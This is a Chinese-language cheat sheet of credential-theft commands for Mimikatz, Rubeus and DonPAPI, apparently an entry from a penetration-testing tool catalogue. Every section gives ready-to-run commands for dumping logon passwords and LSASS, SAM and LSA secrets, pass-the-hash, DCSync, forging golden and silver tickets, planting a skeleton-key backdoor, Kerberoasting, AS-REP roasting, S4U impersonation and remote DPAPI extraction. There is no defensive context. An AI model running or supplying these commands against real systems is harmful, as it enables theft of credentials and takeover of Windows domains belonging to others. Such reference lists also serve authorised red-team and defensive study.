# 凭证窃取

_3 条工具命令_

### Mimikatz  `mimikatz-tool`
_Windows凭证提取工具_

**Step 0**
> 获取Debug权限
_platform: windows_
```
privilege::debug
```

**Step 0**
> 抓取所有登录凭证
_platform: windows_
```
sekurlsa::logonpasswords
```

**Step 0**
> 从LSASS转储文件提取
_platform: windows_
```
sekurlsa::minidump lsass.dmp
```

**Step 0**
> 哈希传递攻击
_platform: windows_
```
sekurlsa::pth /user:Administrator /domain:domain.com /ntlm:HASH
```

**Step 0**
> DCSync获取域管哈希
_platform: windows_
```
lsadump::dcsync /domain:domain.com /user:Administrator
```

**Step 0**
> 导出SAM数据库
_platform: windows_
```
lsadump::sam
```

**Step 0**
> 导出LSA密钥
_platform: windows_
```
lsadump::lsa /inject
```

**Step 0**
> 生成黄金票据
_platform: windows_
```
kerberos::golden /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:HASH /user:Administrator /ptt
```

**Step 0**
> 生成白银票据
_platform: windows_
```
kerberos::golden /domain:domain.com /sid:S-1-5-21-xxx /target:server /service:cifs /rc4:HASH /user:Administrator /ptt
```

**Step 0**
> 列出Kerberos票据
_platform: windows_
```
kerberos::list
```

**Step 0**
> 导出Kerberos票据
_platform: windows_
```
kerberos::list /export
```

**Step 0**
> 植入万能密码
_platform: windows_
```
misc::skeleton
```

---

### Rubeus  `rubeus-tool`
_Kerberos攻击工具_

**Step 0**
> Kerberoasting攻击
_platform: windows_
```
Rubeus.exe kerberoast /stats
```

**Step 0**
> AS-REP Roasting攻击
_platform: windows_
```
Rubeus.exe asreproast /user:username
```

**Step 0**
> 请求TGT票据
_platform: windows_
```
Rubeus.exe asktgt /user:username /password:password
```

**Step 0**
> 请求服务票据
_platform: windows_
```
Rubeus.exe asktgs /service:cifs/server.domain.com /ticket:TICKET_BASE64
```

**Step 0**
> S4U协议攻击
_platform: windows_
```
Rubeus.exe s4u /user:service_account /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target
```

**Step 0**
> 生成黄金票据
_platform: windows_
```
Rubeus.exe golden /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:HASH /user:Administrator
```

**Step 0**
> 注入票据
_platform: windows_
```
Rubeus.exe ptt /ticket:TICKET_BASE64
```

**Step 0**
> 列出当前票据
_platform: windows_
```
Rubeus.exe klist
```

**Step 0**
> 监视新票据
_platform: windows_
```
Rubeus.exe monitor /interval:30
```

---

### DonPAPI  `donpapi-tool`
_DPAPI凭证提取工具_

**Step 0**
> 提取DPAPI凭证
_platform: linux_
```
donpapi domain/user:password@target_ip
```

**Step 0**
> 使用哈希认证
_platform: linux_
```
donpapi -hashes :NTHASH domain/user@target_ip
```

**Step 0**
> 批量提取凭证
_platform: linux_
```
donpapi domain/user:password@targets.txt
```

---
